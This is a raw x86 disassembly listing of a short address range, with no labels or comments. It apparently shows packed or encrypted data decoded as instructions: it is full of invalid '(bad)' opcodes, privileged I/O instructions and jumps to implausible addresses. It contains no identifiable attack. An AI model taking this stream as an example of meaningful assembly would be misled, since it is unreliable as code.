  4199da:	scas   al,BYTE PTR es:[edi]
  4199db:	aas    
  4199dc:	add    BYTE PTR [ebp+ecx*4+0x74],bl
  4199e0:	stc    
  4199e1:	out    0xb0,al
  4199e3:	push   eax
  4199e4:	call   0x41ee6c
  4199e9:	ins    BYTE PTR es:[edi],dx
  4199ea:	shl    ebx,1
  4199ec:	xchg   edx,eax
  4199ed:	test   eax,0xf073c08d
  4199f2:	mov    ebp,0x706661
	...
  419a13:	add    BYTE PTR [edx],dh
  419a15:	je     0x419a10
  419a17:	mov    dh,0x70
  419a19:	jne    0x41999e
  419a1b:	pop    ebp
  419a1c:	je     0x4199c1
  419a1e:	std    
  419a1f:	cmp    DWORD PTR [eax+0xd],esi
  419a22:	(bad)  
  419a23:	cli    
  419a24:	dec    esi
  419a25:	add    BYTE PTR [ecx-0x25cccac],cl
  419a2b:	mov    fs,WORD PTR [edi]
  419a2d:	clc    
  419a2e:	mov    bh,ah
  419a30:	dec    edx
  419a31:	dec    eax
  419a32:	call   0x4252ab
  419a37:	push   0xd896efb8
  419a3c:	test   eax,0xc12f894b
  419a41:	je     0x419abe
  419a43:	gs jno 0x419a12
  419a46:	cmp    al,ch
  419a48:	push   cs
  419a49:	dec    ecx
  419a4a:	push   edi
  419a4b:	push   0x71
  419a4d:	mov    ds:0xa0e86d0d,eax
  419a52:	std    
  419a53:	jmp    0x6492550d
  419a58:	stos   BYTE PTR es:[edi],al
  419a59:	jae    0x419a54
  419a5b:	cs push 0x8d6c8b50
  419a61:	test   eax,0x97b91efd
  419a66:	xor    eax,0x83001162
  419a6b:	sub    eax,edi
  419a6d:	jl     0x419ac6
  419a6f:	add    ch,ah
  419a71:	cld    
  419a72:	dec    DWORD PTR [ecx+ebp*2+0xfff4b0]
	...
  419a95:	add    bl,ah
  419a97:	dec    esp
  419a98:	mov    DWORD PTR [ebp-0x4aa98],eax
  419a9e:	adc    al,0x5b
  419aa0:	adc    DWORD PTR [eax],edx
  419aa2:	(bad)  
  419aa3:	cmp    al,0x0
  419aa5:	sbb    DWORD PTR [ecx+0x70],0x0
  419aa9:	mov    ecx,ebp
  419aab:	imul   edi,DWORD PTR [edi-0x8],0xffffffd3
  419aaf:	stos   DWORD PTR es:[edi],eax
  419ab0:	sbb    DWORD PTR [esi],0x82fffca5
  419ab6:	icebp  
  419ab7:	push   ebx
  419ab8:	sti    
  419ab9:	lea    ebp,[ecx]
  419abb:	(bad)  
  419abd:	push   DWORD PTR [ebx+0x4c]
  419ac0:	mov    DWORD PTR [ebp-0x4a7e0],eax
  419ac6:	inc    esp
  419ac7:	sub    DWORD PTR [ecx-0x4a4627c],eax
  419acd:	push   eax
  419ace:	pushf  
  419acf:	mov    DWORD PTR [edx-0x3fde9c00],ecx
  419ad5:	psubb  mm3,QWORD PTR [ecx]
  419ad8:	add    BYTE PTR [eax],al
  419ada:	je     0x419ae0
  419adc:	add    BYTE PTR [eax],0x64
  419adf:	cld    
  419ae0:	imul   eax,DWORD PTR [ebx],0x67ff3e
  419ae6:	xor    al,0xfc
  419ae8:	jg     0x419a77
  419aea:	test   eax,0xd3fff520
  419aef:	dec    esp
  419af0:	mov    DWORD PTR [ebp-0x34],eax
  419af3:	test   BYTE PTR [eax-0x7ba41c17],dl
  419af9:	rol    BYTE PTR [eax],0x0
	...
  419b18:	inc    ebx
  419b19:	and    BYTE PTR [eax-0x7703dc00],bl
  419b1f:	inc    ebp
  419b20:	in     al,dx
  419b21:	dec    esp
  419b22:	mov    DWORD PTR [ebp+0xd],esi
  419b25:	or     eax,0xd3f5d8ef
  419b2a:	cdq    
  419b2b:	std    
  419b2c:	cli    
  419b2d:	sub    eax,0x126c74c1
  419b32:	cs in  al,0x96
  419b35:	out    dx,eax
  419b36:	test   DWORD PTR [edx-0xb],0x58814c15
  419b3d:	mov    cl,0x4
  419b3f:	jne    0x419b7d
  419b41:	cmp    ecx,DWORD PTR [edi+edi*2]
  419b44:	retf   
  419b45:	test   eax,0x360da001
  419b4a:	dec    ecx
  419b4b:	mov    edx,DWORD PTR [ebx-0x55]
  419b4e:	mov    al,al
  419b50:	cmp    ebx,ebp
  419b52:	stos   DWORD PTR es:[edi],eax
  419b53:	xchg   edx,eax
  419b54:	push   ebp
  419b55:	test   al,0x1
  419b57:	mov    DWORD PTR [ebp-0x1d8b5edc],esp
  419b5d:	sub    ebx,DWORD PTR [edx+0x38f30077]
  419b63:	std    
  419b64:	and    BYTE PTR [ebp+0x2a0d3ff3],bh
  419b6a:	int3   
  419b6b:	std    
  419b6c:	xchg   dx,ax
  419b6e:	aaa    
  419b6f:	push   ebp
  419b70:	and    ah,0x9b
  419b73:	push   eax
  419b74:	jne    0x419b2b
  419b76:	stos   DWORD PTR es:[edi],eax
  419b77:	std    
  419b78:	bound  edx,QWORD PTR [edx-0x39]
  419b7b:	jae    0x419b7d
	...
  419b99:	add    BYTE PTR [ecx-0x7774c5a2],bh
  419b9f:	adc    eax,0x414afd9f
  419ba4:	(bad)  
  419ba6:	inc    edx
  419ba7:	dec    esi
  419ba8:	lea    eax,[ebx+0x5]
  419bab:	adc    ah,dl
  419bad:	xchg   BYTE PTR [eax+0x2bff54d4],dh
  419bb3:	pop    esp
  419bb4:	cdq    
  419bb5:	std    
  419bb6:	clc    
  419bb7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419bb8:	idiv   BYTE PTR [edi]
  419bba:	or     eax,0x15516a00
  419bbf:	lahf   
  419bc0:	arpl   WORD PTR [edi-0x769bf37f],di
  419bc6:	mov    DWORD PTR [eax-0x57a25cf2],ebx
  419bcc:	and    eax,0x6a9ef0b0
  419bd1:	and    ecx,esp
  419bd3:	(bad)  
  419bd4:	jnp    0x419bc3
  419bd6:	xchg   edi,eax
  419bd7:	inc    esp
  419bd8:	out    dx,eax
  419bd9:	stos   DWORD PTR es:[edi],eax
  419bda:	mov    esi,0x86a2e6a7
  419bdf:	test   BYTE PTR [ebx],dl
  419be1:	fwait
  419be2:	enter  0x379e,0xa3
  419be6:	ds nop
  419be8:	into   
  419be9:	clc    
  419bea:	push   cs
  419beb:	repnz es add al,0x8e
  419bef:	mov    edi,0x9da688ee
  419bf4:	mov    dh,0xa2
  419bf6:	mov    ah,0xef
  419bf8:	adc    eax,0xe847d6ac
  419bfd:	add    eax,DWORD PTR [eax]
	...
  419c1b:	add    BYTE PTR [edx+edx*2-0x587ab794],ah
  419c22:	inc    edx
  419c23:	stos   DWORD PTR es:[edi],eax
  419c24:	sbb    BYTE PTR [esi-0x6182e772],0xdc
  419c2b:	nop    DWORD PTR [eax-0x19]
  419c2f:	pop    esp
  419c30:	jnp    0x419c32
  419c32:	out    0x3,eax
  419c34:	xchg   esi,eax
  419c35:	test   BYTE PTR [ebx-0x60],dl
  419c38:	pop    eax
  419c39:	sahf   
  419c3a:	sub    eax,0xb0400d03
  419c3f:	sbb    BYTE PTR [edx-0x76],al
  419c42:	lods   al,BYTE PTR ds:[esi]
  419c43:	xchg   edi,eax
  419c44:	xor    al,0xf3
  419c46:	(bad)  
  419c47:	mov    cl,0x3a
  419c49:	sahf   
  419c4a:	out    0x90,eax
  419c4c:	mov    ?,WORD PTR [ebx+0x3c]
  419c4f:	mov    ds:0xe900c528,al
  419c54:	push   cs
  419c55:	inc    eax
  419c56:	inc    edi
  419c57:	mov    ah,0x79
  419c59:	sar    BYTE PTR [edi-0x38c7333a],1
  419c5f:	sub    edx,DWORD PTR [edx]
  419c61:	add    BYTE PTR [edx-0x17],ch
  419c64:	xor    BYTE PTR [eax],al
  419c66:	push   0xffffffe9
  419c68:	sub    BYTE PTR [edx],al
  419c6a:	push   0xffffffe9
  419c6c:	scas   eax,DWORD PTR es:[edi]
  419c6d:	adc    al,0x24
  419c6f:	(bad)  [edi+0x4edb8bf1]
  419c75:	add    BYTE PTR [ecx-0x78fe0d63],cl
  419c7b:	sub    BYTE PTR ds:0x64c6cf,al
	...
  419c9d:	add    cl,dl
  419c9f:	or     edx,DWORD PTR [ebx+0x8cba9]
  419ca5:	xor    al,0x88
  419ca7:	lods   al,BYTE PTR ds:[esi]
  419ca8:	or     ebp,0x9ec7f91
  419cae:	loopne 0x419ce2
  419cb0:	call   0xfddedb6f
  419cb5:	(bad)  
  419cb6:	cli    
  419cb7:	repz sub DWORD PTR [ecx+0x258b1bf5],0x75
  419cbf:	or     DWORD PTR [eax+0x3],edx
  419cc2:	or     DWORD PTR [edx+0x4d76c544],0x9b35e96a
  419ccc:	adc    esi,DWORD PTR [ecx]
  419cce:	dec    edi
  419ccf:	aas    
  419cd0:	add    BYTE PTR [ecx+ecx*2+0x18],ch
  419cd4:	popa   
  419cd5:	push   0x2d
  419cd7:	in     al,0x13
  419cd9:	jmp    0xddc2d8d8
  419cde:	xor    bh,ch
  419ce0:	(bad)  
  419ce1:	fcom   QWORD PTR [ebx]
  419ce3:	fwait
  419ce4:	je     0x419ceb
  419ce6:	xor    DWORD PTR [ebp+0x3e80099],esp
  419cec:	add    BYTE PTR [ebp-0xb80b0c],al
  419cf2:	pusha  
  419cf3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419cf4:	sbb    eax,0xfd0f8ce8
  419cf9:	call   FWORD PTR [edi-0x5f247ea5]
  419cff:	mov    ecx,0x67
	...
  419d20:	(bad)  
  419d21:	push   0xe5b0b1
  419d26:	add    eax,0x528a770
  419d2c:	mov    al,ds:0xf1003fbe
  419d31:	nop
  419d32:	in     eax,dx
  419d33:	inc    edx
  419d34:	in     al,0x76
  419d36:	add    DWORD PTR [eax],esp
  419d38:	retf   0x43
  419d3b:	adc    BYTE PTR [eax+0x9],ah
  419d3e:	xchg   DWORD PTR [ebp-0x48],ecx
  419d41:	mov    bl,0x7e
  419d43:	mov    al,0xa4
  419d45:	add    BYTE PTR [eax],al
  419d47:	mov    edi,ecx
  419d49:	inc    DWORD PTR [ecx+eax*4+0x124]
  419d50:	pop    es
  419d51:	pop    edi
  419d52:	adc    DWORD PTR [edi+esi*4],eax
  419d55:	inc    eax
  419d56:	add    bh,bh
  419d58:	icebp  
  419d59:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419d5a:	cld    
  419d5b:	jne    0x419db1
  419d5d:	pop    edi
  419d5e:	jno    0x419d7c
  419d60:	fwait
  419d61:	cmc    
  419d62:	pop    ss
  419d63:	push   edi
  419d64:	mov    esi,ebp
  419d66:	ud0    esi,DWORD PTR [ecx+0xc]
  419d6a:	sti    
  419d6b:	jne    0x419dc9
  419d6d:	pop    edi
  419d6e:	adc    DWORD PTR [eax+0x7a],eax
  419d71:	inc    ebx
  419d72:	add    BYTE PTR [edi-0x1],bl
  419d75:	mov    ah,cl
  419d77:	pop    ebp
  419d78:	mov    eax,es:0x6cbf54fd
  419d7e:	jge    0x419d6c
  419d80:	or     eax,0x2e3
	...
  419da1:	add    BYTE PTR ds:0xfd73a05a,cl
  419da7:	adc    DWORD PTR [esi],edi
  419da9:	or     BYTE PTR [edx],ch
  419dab:	push   ebx
  419dac:	in     eax,dx
  419dad:	cld    
  419dae:	cwde   
  419daf:	(bad)  
  419db0:	sahf   
  419db1:	jae    0x419da4
  419db3:	in     eax,dx
  419db4:	adc    eax,0xfd7b1220
  419db9:	cld    
  419dba:	add    BYTE PTR [ecx],0x9f
  419dbd:	jae    0x419dd8
  419dbf:	repnz adc eax,0xd74fa10
  419dc5:	push   ecx
  419dc6:	repnz mov esp,0xa94ede45
  419dcc:	mov    al,BYTE PTR [ebx+0x31]
  419dcf:	sub    al,0xc1
  419dd1:	or     eax,0x10185
  419dd6:	or     eax,0xc2447bb
  419ddb:	stos   BYTE PTR es:[edi],al
  419ddc:	test   esi,ebx
  419dde:	or     eax,0xd68301a9
  419de3:	mov    edx,0xa90dd685
  419de8:	add    DWORD PTR [ecx+0xd01ad28],eax
  419dee:	mov    DWORD PTR [ebp+0x4],esp
  419df1:	add    BYTE PTR ds:0xcb0aec1,cl
  419df7:	test   eax,0x251ac085
  419dfc:	pop    ebp
  419dfd:	add    BYTE PTR ds:0x7a319ea9,cl
  419e03:	xchg   esp,eax
  419e04:	xchg   ebp,eax
  419e05:	adc    BYTE PTR [eax],al
	...
  419e23:	add    ch,cl
  419e25:	test   al,0x88
  419e27:	rcr    BYTE PTR [edx],0x25
  419e2a:	ins    DWORD PTR es:[edi],dx
  419e2b:	add    BYTE PTR ds:0x44e831a9,cl
  419e31:	fild   DWORD PTR [edx]
  419e33:	add    BYTE PTR [eax+eax*1-0x3f702c54],al
  419e3a:	out    dx,al
  419e3b:	xchg   DWORD PTR [ebx-0x1cfc1900],esp
  419e41:	xor    ah,BYTE PTR [edx-0x25]
  419e44:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419e45:	call   DWORD PTR [esi-0x1794a955]
  419e4b:	add    edx,DWORD PTR [eax+edx*4-0x7b0ee6a0]
  419e52:	xor    eax,0xdbe69318
  419e57:	xlat   BYTE PTR ds:[ebx]
  419e58:	call   0x86cc859b
  419e5d:	or     al,0x64
  419e5f:	mov    DWORD PTR [ecx-0x63],eax
  419e62:	push   cs
  419e63:	lahf   
  419e64:	pop    ebp
  419e65:	fwait
  419e66:	mov    esi,0xf6efd384
  419e6b:	inc    ecx
  419e6c:	or     eax,0xd7d86cc3
  419e71:	call   0x9ee7:0x10d02ee
  419e78:	push   ds
  419e79:	or     cl,bh
  419e7b:	inc    ebx
  419e7c:	or     eax,0x4d17a785
  419e81:	xchg   DWORD PTR [edi+ebp*4-0x4a],esp
  419e85:	call   0x0:0xdac6
	...
  419ea4:	add    BYTE PTR [eax],al
  419ea6:	cmovl  ebx,DWORD PTR [ebp-0x6eaf2be]
  419ead:	xchg   ebp,eax
  419eae:	push   cs
  419eaf:	loopne 0x419e3d
  419eb1:	inc    edx
  419eb2:	or     eax,0x3c061af0
  419eb7:	push   ebp
  419eb8:	and    DWORD PTR [eax-0x779b6580],0x41
  419ebf:	popf   
  419ec0:	mov    ds,WORD PTR [esi-0x73416523]
  419ec6:	sahf   
  419ec7:	mov    ds:0xc2609e7c,eax
  419ecc:	add    BYTE PTR [edx+eax*2-0x6b],ch
  419ed0:	std    
  419ed1:	outs   dx,BYTE PTR ds:[esi]
  419ed2:	or     al,0x0
  419ed4:	(bad)  
  419ed5:	call   0xf8c98d85
  419eda:	into   
  419edb:	inc    DWORD PTR [edx+0x67ee1529]
  419ee1:	jmp    0xd3419e74
  419ee6:	push   cs
  419ee7:	popf   
  419ee8:	jae    0x419eef
  419eea:	adc    al,0xfc
  419eed:	fdivr  st(6),st
  419eef:	in     eax,dx
  419ef0:	aas    
  419ef1:	jmp    0x2671ad69
  419ef6:	add    eax,0xea910fe
  419efb:	cmp    ebx,DWORD PTR [esi+0x62]
  419efe:	inc    ebp
  419eff:	in     al,dx
  419f00:	pop    eax
  419f01:	and    ah,cl
  419f03:	in     al,dx
  419f04:	call   FWORD PTR [ebx-0x29175369]
	...
  419f26:	add    BYTE PTR [eax],al
  419f28:	ds cdq 
  419f2a:	std    
  419f2b:	ins    DWORD PTR es:[edi],dx
  419f2c:	into   
  419f2d:	or     eax,0xdd738c05
  419f32:	dec    edi
  419f33:	(bad)  
  419f34:	dec    esp
  419f35:	add    BYTE PTR [ecx+0x37],dl
  419f38:	xchg   esp,eax
  419f39:	or     eax,0x9b033e14
  419f3e:	jae    0x419f39
  419f40:	in     al,0xff
  419f42:	cld    
  419f43:	cmp    al,0x19
  419f45:	fwait
  419f46:	adc    edx,DWORD PTR ds:0x1f003f63
  419f4c:	js     0x419f5b
  419f4e:	adc    BYTE PTR [edx+0x71],ah
  419f51:	fwait
  419f52:	jae    0x419f49
  419f54:	test   eax,0x7a9e080d
  419f59:	dec    ecx
  419f5a:	fisubr WORD PTR [edx]
  419f5c:	adc    DWORD PTR [edi+0x119064d8],eax
  419f62:	push   esp
  419f63:	add    cl,bh
  419f65:	push   esi
  419f66:	js     0x419fb8
  419f68:	jmp    0xe78e13de
  419f6d:	mov    ecx,0x7f2b73fd
  419f72:	jns    0x419f84
  419f74:	xor    al,0xf1
  419f76:	cmp    al,0xbe
  419f78:	clc    
  419f79:	(bad)  
  419f7a:	aas    
  419f7b:	add    BYTE PTR [edx+0x7c],bh
  419f7e:	adc    DWORD PTR [eax],ebx
  419f80:	ss cmp eax,0x6939f600
  419f86:	mov    DWORD PTR [ebx+0x34],0x2570fe
	...
  419fa9:	add    BYTE PTR [ecx+ebp*4+0x76],cl
  419fad:	inc    eax
  419fae:	and    al,0x7c
  419fb0:	adc    DWORD PTR [esi+eax*1+0x3d],edx
  419fb4:	add    BYTE PTR [ebp-0x74fb07cc],al
  419fba:	sbb    al,0x6c
  419fbc:	dec    ebp
  419fbd:	and    ebp,0xa602e6fc
  419fc3:	mov    esp,0x458c084
  419fc8:	jg     0x419fd7
  419fca:	adc    bh,al
  419fcc:	aas    
  419fcd:	add    ch,ah
  419fcf:	sar    dl,cl
  419fd1:	adc    eax,0x3d8e10
  419fd6:	add    ebx,edx
  419fd8:	xchg   bl,al
  419fda:	(bad)  
  419fdb:	fadd   st,st(1)
  419fdd:	adc    BYTE PTR [ecx+edx*8-0x30fa137a],ah
  419fe4:	push   ebp
  419fe5:	mov    ebx,ecx
  419fe7:	or     edx,DWORD PTR [ebx-0x1]
  419fea:	mov    ecx,0xa44012c0
  419fef:	test   DWORD PTR [ecx-0x4],eax
  419ff2:	hlt    
  419ff3:	mov    ebx,0xf0b28afd
  419ff8:	xor    ecx,DWORD PTR [edx-0x267a6ef3]
  419ffe:	stc    
  419fff:	pop    edx
  41a000:	call   0x85bb36f9
  41a005:	(bad)  
  41a007:	mov    cl,0x87
  41a009:	sbb    dl,BYTE PTR [ecx+0x20156d]
	...
  41a02b:	add    BYTE PTR [edx],al
  41a02d:	jmp    0x615bb636
  41a032:	mov    eax,0x3b34e29
  41a037:	inc    edx
  41a038:	cmc    
  41a039:	stos   BYTE PTR es:[edi],al
  41a03a:	repz jb 0x41a061
  41a03d:	xlat   BYTE PTR es:[ebx]
  41a03f:	call   FWORD PTR [esi+0x48a428c]
  41a045:	popa   
  41a046:	test   ecx,ebx
  41a048:	mov    al,ds:0x88c6cff8
  41a04d:	fist   WORD PTR [ecx+edi*1]
  41a050:	xchg   esi,eax
  41a051:	fs popf 
  41a053:	mov    edi,DWORD PTR [ecx]
  41a055:	test   al,0x81
  41a057:	cmp    BYTE PTR ds:[ebx+edx*2+0x39],dh
  41a05c:	inc    eax
  41a05d:	mov    eax,ds:0x808d0615
  41a062:	pushf  
  41a063:	es pop eax
  41a065:	xor    cl,BYTE PTR [esi+0x27a80c74]
  41a06b:	cmp    esp,DWORD PTR es:[esi-0x16e1940d]
  41a072:	add    eax,DWORD PTR [ebx+0x560b2ccd]
  41a078:	mov    edx,0x4d12bd94
  41a07d:	test   eax,0x66f602ae
  41a082:	lea    ecx,[ebx+0x11]
  41a085:	adc    BYTE PTR [ebx],al
  41a087:	mov    ebx,edx
  41a089:	ret    0x3106
  41a08c:	int    0x7
  41a08e:	cmp    eax,0xc7
	...
  41a0ab:	add    BYTE PTR [eax],al
  41a0ad:	add    BYTE PTR [edi+0x0],cl
  41a0b0:	out    dx,eax
  41a0b1:	add    ebx,esi
  41a0b3:	mov    cl,BYTE PTR [ebx+0x39d46987]
  41a0b9:	xor    esp,edi
  41a0bb:	shr    DWORD PTR ds:0x74bb1c33,cl
  41a0c1:	inc    ecx
  41a0c2:	dec    ecx
  41a0c3:	xor    edx,DWORD PTR [edi]
  41a0c5:	fwait
  41a0c6:	(bad)  
  41a0c7:	das    
  41a0c8:	fld    QWORD PTR [ebx+0xd]
  41a0cb:	shl    DWORD PTR [esi-0xc4373bc],cl
  41a0d1:	mov    esi,cs
  41a0d3:	mov    bh,0x70
  41a0d5:	inc    ecx
  41a0d6:	inc    ecx
  41a0d7:	mov    DWORD PTR [edi+edx*4+0x34233d86],ebp
  41a0de:	mov    esp,0x15114632
  41a0e3:	mov    DWORD PTR [edi+edi*4-0xe8d12e8],edi
  41a0ea:	sar    bh,cl
  41a0ec:	arpl   sp,ax
  41a0ee:	jle    0x41a0ef
  41a0f0:	fadd   st,st(3)
  41a0f2:	jmp    0xf72a:0xd03e751
  41a0f9:	xor    ebp,esp
  41a0fb:	sbb    al,0xa4
  41a0fd:	add    al,0xd
  41a0ff:	xchg   edi,eax
  41a100:	jl     0x41a0b1
  41a102:	xchg   esp,eax
  41a103:	cmp    al,0x1f
  41a105:	lods   al,BYTE PTR ds:[esi]
  41a106:	cmp    ah,ah
  41a108:	out    0x3,eax
  41a10a:	mov    bh,ch
  41a10c:	mov    cl,0xc6
  41a10e:	inc    ecx
  41a10f:	mov    al,ds:0x9d2
	...
  41a130:	xchg   esp,eax
  41a131:	cmp    al,0xd7
  41a133:	xor    ebp,0xffffffe6
  41a136:	pop    ebx
  41a137:	cmpxchg BYTE PTR [ebx+edx*8-0x66],al
  41a13c:	dec    esi
  41a13d:	nop
  41a13e:	add    BYTE PTR [ecx],bh
  41a140:	cdq    
  41a141:	push   cs
  41a142:	int3   
  41a143:	mov    cs,WORD PTR [esi-0x6c]
  41a146:	add    BYTE PTR [edx+0x45],ah
  41a149:	mov    WORD PTR [ebx-0x7368e6d3],cs
  41a14f:	cs or  cl,bl
  41a152:	rcl    BYTE PTR [ecx*1+0xd82bfd1],0xa8
  41a15a:	sti    
  41a15b:	sub    dl,BYTE PTR [eax]
  41a15d:	add    BYTE PTR [edi-0x3f26f2d1],al
  41a163:	hlt    
  41a164:	or     DWORD PTR [ebp+0x42688136],edx
  41a16a:	(bad)  
  41a16b:	call   0xdd3f17eb
  41a170:	xchg   edx,eax
  41a171:	aas    
  41a172:	std    
  41a173:	aam    0x9e
  41a175:	das    
  41a176:	call   0xfdd89421
  41a17b:	dec    esi
  41a17c:	std    
  41a17d:	xchg   ebx,eax
  41a17e:	mov    DWORD PTR [edi+0x354b8722],ebp
  41a184:	ja     0x41a198
  41a186:	clc    
  41a187:	rol    BYTE PTR fs:[edi],cl
  41a18a:	call   FWORD PTR [eax-0x17bc324a]
  41a190:	push   cs
  41a191:	xchg   DWORD PTR [esi-0x1b],eax
	...
  41a1b0:	add    BYTE PTR [eax],al
  41a1b2:	int3   
  41a1b3:	add    BYTE PTR ds:0x87fc4c62,ch
  41a1b9:	in     eax,dx
  41a1ba:	ja     0x7d919f03
  41a1c0:	inc    esi
  41a1c1:	icebp  
  41a1c2:	sub    al,0x87
  41a1c4:	inc    ebx
  41a1c5:	adc    eax,0xdd467d2c
  41a1ca:	fwait
  41a1cb:	inc    ecx
  41a1cc:	shr    BYTE PTR [edx+0x71],1
  41a1cf:	push   DWORD PTR [ebx-0x11]
  41a1d2:	inc    esi
  41a1d3:	or     al,0x3
  41a1d5:	popa   
  41a1d6:	test   DWORD PTR ds:0x3ecce3e9,0x64b6000e
  41a1e0:	add    al,0xc6
  41a1e2:	repnz or ebp,edi
  41a1e5:	scas   eax,DWORD PTR es:[edi]
  41a1e6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a1e7:	fcom   DWORD PTR [esi-0x37]
  41a1ea:	mov    dh,0x0
  41a1ec:	add    BYTE PTR [ebp-0x1],dl
  41a1ef:	addr16 jg 0x41a1de
  41a1f2:	je     0x41a1c0
  41a1f4:	push   ebp
  41a1f5:	push   edi
  41a1f6:	fwait
  41a1f7:	add    eax,0x6c018d08
  41a1fc:	das    
  41a1fd:	(bad)  [edi-0x25141788]
  41a203:	jbe    0x41a200
  41a205:	test   BYTE PTR [eax+esi*8+0x6ff18b60],ah
  41a20c:	xchg   DWORD PTR [ebp-0x54],ecx
  41a20f:	in     eax,0x2a
  41a211:	push   ebx
  41a212:	mov    esp,0xfefe97
	...
  41a233:	add    BYTE PTR [ecx-0x7b],dl
  41a236:	sti    
  41a237:	adc    eax,0x3d8c3c
  41a23c:	btc    DWORD PTR [esp+edi*1+0xc],esi
  41a241:	aam    0xfc
  41a243:	jae    0x41a258
  41a245:	sar    DWORD PTR [esi-0x38],1
  41a248:	cmp    esp,DWORD PTR [ebx+esi*2+0x2b]
  41a24c:	cmc    
  41a24d:	add    BYTE PTR [edi+0x746beff0],al
  41a253:	sub    BYTE PTR [eax+eax*1-0x340bf000],cl
  41a25a:	dec    esi
  41a25b:	push   esi
  41a25c:	or     esp,DWORD PTR [ebp+0xa413b1]
  41a262:	add    eax,0x68539151
  41a268:	or     eax,0x3700006d
  41a26d:	leave  
  41a26e:	sti    
  41a26f:	call   0x404bd3
  41a274:	or     eax,0xb5569922
  41a279:	cmc    
  41a27a:	inc    edx
  41a27b:	jmp    DWORD PTR [edx-0x5a0ff143]
  41a281:	fld    QWORD PTR [edx-0x1]
  41a284:	xchg   edx,eax
  41a285:	dec    ebp
  41a286:	push   cs
  41a287:	hlt    
  41a288:	jne    0x41a22f
  41a28a:	inc    esp
  41a28b:	inc    DWORD PTR [edx-0x24a23fef]
  41a291:	inc    ecx
  41a292:	leave  
  41a293:	ret    0xa709
  41a296:	das    
  41a297:	mov    DWORD PTR [eax],eax
	...
  41a2b5:	add    BYTE PTR [ebp+0x26],bl
  41a2b8:	xlat   BYTE PTR ds:[ebx]
  41a2b9:	cmp    ebx,eax
  41a2bb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a2bc:	aas    
  41a2bd:	sbb    BYTE PTR [ebx],0xc6
  41a2c0:	push   cs
  41a2c1:	dec    eax
  41a2c3:	cmc    
  41a2c4:	xchg   esi,eax
  41a2c5:	je     0x41a2b8
  41a2c7:	mov    dl,0x2f
  41a2c9:	std    
  41a2ca:	sbb    BYTE PTR [edi-0xc],dh
  41a2cd:	aas    
  41a2ce:	or     eax,0x1273c11c
  41a2d3:	and    ebp,edi
  41a2d5:	cmp    eax,0x140ce691
  41a2da:	loope  0x41a2e2
  41a2dc:	adc    BYTE PTR [eax],dl
  41a2de:	(bad)  [edi-0x642efbed]
  41a2e4:	invd   
  41a2e6:	dec    ecx
  41a2e7:	mov    ds:0xaa41040d,eax
  41a2ec:	push   cs
  41a2ed:	add    al,0xbd
  41a2ef:	test   al,0xac
  41a2f1:	add    bh,BYTE PTR [edi]
  41a2f3:	jmp    0xa953652e
  41a2f8:	cs mov ecx,esi
  41a2fb:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  41a2fd:	adc    BYTE PTR [esi],bl
  41a2ff:	shr    BYTE PTR [edi],1
  41a301:	xor    edx,edx
  41a303:	and    BYTE PTR [esi-0xc],al
  41a306:	xchg   ebp,eax
  41a307:	je     0x41a2a0
  41a309:	xchg   DWORD PTR [eax+0x0],eax
  41a30c:	xlat   BYTE PTR ds:[ebx]
  41a30d:	lea    eax,[esi-0x68]
  41a310:	and    BYTE PTR [ecx+0x5],cl
  41a313:	add    ebp,DWORD PTR [ebp-0x32]
  41a316:	stos   DWORD PTR es:[edi],eax
  41a317:	xchg   ebx,eax
  41a318:	out    0x2d,eax
	...
  41a336:	add    BYTE PTR [eax],al
  41a338:	mov    ah,0xfe
  41a33a:	stc    
  41a33b:	int3   
  41a33c:	loop   0x41a382
  41a33e:	mov    bl,0x10
  41a340:	add    eax,DWORD PTR [eax+0xd48f6f3]
  41a346:	fist   WORD PTR [esi+0x9908bd6]
  41a34c:	jp     0x41a2e1
  41a34e:	out    0x88,eax
  41a350:	cmp    ebx,esi
  41a352:	pusha  
  41a353:	(bad)  
  41a354:	es aam 0xdd
  41a357:	xor    BYTE PTR [esi-0x7bfc1900],0x3d
  41a35e:	jae    0x41a2f7
  41a360:	into   
  41a361:	mov    ebp,DWORD PTR [esp+eax*8+0x18]
  41a365:	jge    0x41a3e0
  41a367:	add    al,0xd
  41a369:	add    BYTE PTR [edx+0x11],dh
  41a36c:	add    eax,0xb68455e7
  41a371:	xchg   ecx,eax
  41a372:	out    0x88,eax
  41a374:	shl    edx,1
  41a376:	out    0xf,eax
  41a378:	bnd jle 0x41a3c0
  41a37b:	dec    DWORD PTR [ecx]
  41a37d:	jp     0x41a3a0
  41a37f:	add    al,0xd
  41a381:	add    BYTE PTR [edi-0x24],ah
  41a384:	cmp    DWORD PTR [ebx],eax
  41a386:	fs mov ch,0xd
  41a389:	add    bh,ah
  41a38b:	sub    eax,DWORD PTR [ebp+0x6703a709]
  41a391:	cli    
  41a392:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a393:	ss cmc 
  41a395:	aad    0xd
  41a397:	xchg   edi,eax
  41a398:	loopne 0x41a415
  41a39a:	daa    
  41a39b:	pop    es
	...
  41a3b8:	add    BYTE PTR [eax],al
  41a3ba:	xchg   ecx,eax
  41a3bb:	push   esi
  41a3bc:	out    0x3,eax
  41a3be:	or     eax,0xa0ac00ba
  41a3c3:	jmp    esi
  41a3c5:	cmp    ecx,DWORD PTR [ecx]
  41a3c7:	add    BYTE PTR [eax],al
  41a3c9:	push   ebx
  41a3ca:	mov    ebx,0xd63933
  41a3cf:	in     eax,dx
  41a3d0:	addr16 popa 
  41a3d2:	sbb    BYTE PTR [eax+0x0],al
  41a3d5:	shl    DWORD PTR [esi+0x1ac6fd93],0xc0
  41a3dc:	je     0x41a3ce
  41a3de:	push   eax
  41a3df:	ds (bad) 
  41a3e1:	call   0xe9420f9f
  41a3e6:	push   cs
  41a3e7:	mov    edx,0x50ea643
  41a3ec:	mov    dh,0x24
  41a3ee:	call   0x4009:0xfe51b604
  41a3f5:	jmp    0xdeb82f41
  41a3fa:	or     ebx,0xffffff82
  41a3fd:	sbb    DWORD PTR [esi+0x40],ecx
  41a400:	add    BYTE PTR [edx-0x33],ah
  41a403:	(bad)  
  41a404:	mov    esp,DWORD PTR ds:0x4ce59141
  41a40a:	mov    al,ds:0x4e65fd94
  41a40f:	push   cs
